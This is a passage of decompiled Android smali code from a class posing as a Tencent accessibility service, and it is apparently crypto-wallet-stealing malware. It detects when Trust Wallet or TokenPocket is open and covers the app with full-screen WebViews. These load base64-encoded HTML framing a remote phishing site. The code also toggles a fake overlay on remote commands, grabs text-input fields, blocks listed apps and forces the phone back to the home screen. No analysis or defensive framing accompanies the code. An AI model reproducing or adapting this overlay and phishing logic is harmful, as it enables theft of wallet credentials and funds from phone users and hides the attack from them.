    const-string v4, "hPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90b2tlbnBvY2tldCIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_a

    :cond_1f
    const-string v4, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90b2tlbnBvY2tldC9rb3JlYSIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_a

    :cond_20
    const-string v4, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90b2tlbnBvY2tldC9qYXBhbiIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_a

    :cond_21
    const-string v4, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90b2tlbnBvY2tldCIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    .line 2177
    :goto_a
    invoke-virtual {v1, v4, v8, v15}, Landroid/webkit/WebView;->loadData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2178
    invoke-direct {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->loadMyPage(Landroid/webkit/WebView;)V

    .line 2182
    :cond_22
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v4, "STR"

    .line 2183
    invoke-static {v1, v4, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2a

    const-string v1, "com.wallet.crypto.trustapp"

    .line 2184
    invoke-virtual {v13, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2a

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/16 v2, 0x800

    if-ne v1, v2, :cond_2a

    .line 2185
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "STR"

    invoke-static {v1, v2, v10}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 2188
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$MyWebView;

    invoke-direct {v1, v0, v0}, Lcom/tencent/AccessibilityServiceCore$MyWebView;-><init>(Lcom/tencent/AccessibilityServiceCore;Landroid/content/Context;)V

    .line 2189
    new-instance v2, Landroid/view/ViewGroup$LayoutParams;

    const/4 v3, -0x1

    invoke-direct {v2, v3, v3}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 2190
    invoke-virtual {v1}, Landroid/webkit/WebView;->requestFocus()Z

    const/4 v2, 0x1

    .line 2191
    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setFocusable(Z)V

    .line 2192
    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setFocusableInTouchMode(Z)V

    .line 2193
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v4

    .line 2194
    invoke-virtual {v4, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 2195
    invoke-virtual {v4, v2}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    .line 2196
    invoke-virtual {v4, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 2197
    invoke-virtual {v4, v2}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    const/4 v2, 0x0

    .line 2198
    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    const/4 v2, 0x2

    const/4 v11, 0x0

    .line 2199
    invoke-virtual {v1, v2, v11}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    .line 2200
    new-instance v2, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;

    invoke-direct {v2, v0, v11}, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 2201
    new-instance v2, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;

    invoke-direct {v2, v0, v11}, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    const/16 v2, 0x82

    .line 2202
    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->requestFocus(I)Z

    .line 2203
    invoke-virtual {v1}, Landroid/webkit/WebView;->requestFocusFromTouch()Z

    const/4 v2, 0x1

    .line 2204
    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setEnabled(Z)V

    .line 2205
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v2

    .line 2206
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/16 v10, 0xca9

    if-eq v4, v10, :cond_25

    const/16 v10, 0xd37

    if-eq v4, v10, :cond_24

    const/16 v7, 0xd64

    if-eq v4, v7, :cond_23

    goto :goto_b

    :cond_23
    invoke-virtual {v2, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_26

    const/4 v2, 0x2

    goto :goto_c

    :cond_24
    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_26

    const/4 v2, 0x1

    goto :goto_c

    :cond_25
    invoke-virtual {v2, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_26

    const/4 v2, 0x0

    goto :goto_c

    :cond_26
    :goto_b
    move v2, v3

    :goto_c
    if-eqz v2, :cond_29

    const/4 v4, 0x1

    if-eq v2, v4, :cond_28

    const/4 v4, 0x2

    if-eq v2, v4, :cond_27

    const-string v2, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90cnVzdCIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_d

    :cond_27
    const-string v2, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90cnVzdC9rb3JlYSIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_d

    :cond_28
    const-string v2, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90cnVzdC9qYXBhbiIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_d

    :cond_29
    const-string v2, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90cnVzdCIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    .line 2225
    :goto_d
    invoke-virtual {v1, v2, v8, v15}, Landroid/webkit/WebView;->loadData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2226
    invoke-direct {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->loadMyPage(Landroid/webkit/WebView;)V

    goto :goto_e

    :cond_2a
    const/4 v3, -0x1

    const/4 v11, 0x0

    :goto_e
    const/4 v1, 0x5

    if-ne v12, v1, :cond_2c

    .line 2232
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.transsion.XOSLauncher.upgrade"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.google.android.apps.nexuslauncher"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.android.launcher3"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.android.launcher2"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.android.launcher"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.bbk.launcher2"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.bbk.launcher"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.huawei.android.launcher"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.miui.home"

    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2c

    .line 2233
    :cond_2b
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    const/16 v2, 0x8

    invoke-virtual {v1, v2}, Landroid/widget/FrameLayout;->setVisibility(I)V

    .line 2234
    .line 2235
    .line 2239
    :cond_2c
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/4 v2, 0x1

    if-ne v1, v2, :cond_2f

    .line 2240
    iget-boolean v1, v0, Lcom/tencent/AccessibilityServiceCore;->showtrust:Z

    if-eqz v1, :cond_2d

    if-eqz v1, :cond_2d

    const/4 v2, 0x2

    if-ne v1, v2, :cond_2d

    const-string v1, "com.wallet.crypto.trustapp"

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2d

    const-string v1, "com.wallet.crypto.trustapp:id/action_send"

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2d

    .line 2241
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    const/16 v2, 0x8

    invoke-virtual {v1, v2}, Landroid/widget/FrameLayout;->setVisibility(I)V

    .line 2242
    goto :goto_f

    .line 2244
    :cond_2d
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    .line 2245
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    const-string v4, "com.android.systemui"

    invoke-virtual {v2, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2f

    const-string v2, "\u4e3b\u5c4f\u5e55"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2e

    const-string v2, "Home"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2e

    const-string v2, "home_button"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2e

    const-string v2, "recent_apps"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2e

    const-string v2, "Overview"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2f

    .line 2246
    :cond_2e
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    const/16 v2, 0x8

    invoke-virtual {v1, v2}, Landroid/widget/FrameLayout;->setVisibility(I)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_d

    .line 2247
    .line 2248
    .line 2258
    :cond_2f
    :goto_f
    :try_start_4
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->DisabledApps:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v1

    if-lez v1, :cond_30

    .line 2259
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->DisabledApps:Ljava/util/List;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v1, v2}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_30

    .line 2262
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 2263
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 2275
    :catch_2
    :cond_30
    :try_start_5
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_10

    :catch_3
    move-object v1, v11

    :goto_10
    if-eqz v1, :cond_31

    const/4 v2, 0x1

    goto :goto_11

    :cond_31
    const/4 v2, 0x0

    .line 2293
    :goto_11
    :try_start_6
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    const-string v5, "android.widget.EditText"

    invoke-virtual {v4, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v4

    and-int/2addr v2, v4

    if-eqz v2, :cond_32

    .line 2294
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 2302
    :catch_4
    :cond_32
    :try_start_7
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    :catch_5
    if-eqz v11, :cond_33

    :try_start_8
    const-string v2, "SKL"

    const/4 v4, 0x0

    .line 2307
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v0, v2, v5}, Lcom/tencent/My_tunesxconcerningn10_Settings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v2

    if-eqz v2, :cond_33

    .line 2309
    new-instance v2, Ljava/lang/Thread;

    new-instance v4, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda14;

    invoke-direct {v4, v0, v11}, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda14;-><init>(Lcom/tencent/AccessibilityServiceCore;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-direct {v2, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 2311
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    :catch_6
    :cond_33
    const/16 v2, 0x20

    if-eq v6, v2, :cond_40

    const/16 v2, 0x40

    if-eq v6, v2, :cond_3c

    const/16 v2, 0x4000

    if-eq v6, v2, :cond_34

    goto/16 :goto_14

    .line 2322
    :cond_34
    :try_start_9
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    .line 2323
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    sparse-switch v4, :sswitch_data_0

    goto :goto_12

    :sswitch_0
    const-string v4, "[unBlock]"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_35

    const/4 v3, 0x3

    goto :goto_12

    :sswitch_1
    const-string v4, "[Block]"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_35

    const/4 v3, 0x2

    goto :goto_12

    :sswitch_2
    const-string v4, "[unbassit]"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_35

    const/4 v3, 0x1

    goto :goto_12

    :sswitch_3
    const-string v4, "[bassit]"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_8

    if-eqz v2, :cond_35

    const/4 v3, 0x0

    :cond_35
    :goto_12
    if-eqz v3, :cond_39

    const/4 v2, 0x1

    if-eq v3, v2, :cond_38

    const/4 v2, 0x2

    if-eq v3, v2, :cond_37

    const/4 v2, 0x3

    if-eq v3, v2, :cond_36

    goto :goto_13

    .line 2371
    :cond_36
    :try_start_a
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v2}, Landroid/widget/FrameLayout;->getWindowToken()Landroid/os/IBinder;

    move-result-object v2

    if-eqz v2, :cond_3a

    .line 2372
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setFocusable(Z)V

    .line 2373
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setClickable(Z)V

    .line 2374
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    const/16 v3, 0x8

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setVisibility(I)V

    goto :goto_13

    .line 2358
    :cond_37
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v2}, Landroid/widget/FrameLayout;->getWindowToken()Landroid/os/IBinder;

    move-result-object v2

    if-eqz v2, :cond_3a

    .line 2359
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setFocusable(Z)V

    .line 2360
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setClickable(Z)V

    .line 2361
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setVisibility(I)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_7

    goto :goto_13

    .line 2336
    :cond_38
    :try_start_b
    new-instance v2, Landroid/os/Handler;

    invoke-direct {v2}, Landroid/os/Handler;-><init>()V

    .line 2337
    new-instance v3, Lcom/tencent/AccessibilityServiceCore$16;

    invoke-direct {v3, v0}, Lcom/tencent/AccessibilityServiceCore$16;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    const-wide/16 v4, 0x1

    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_8

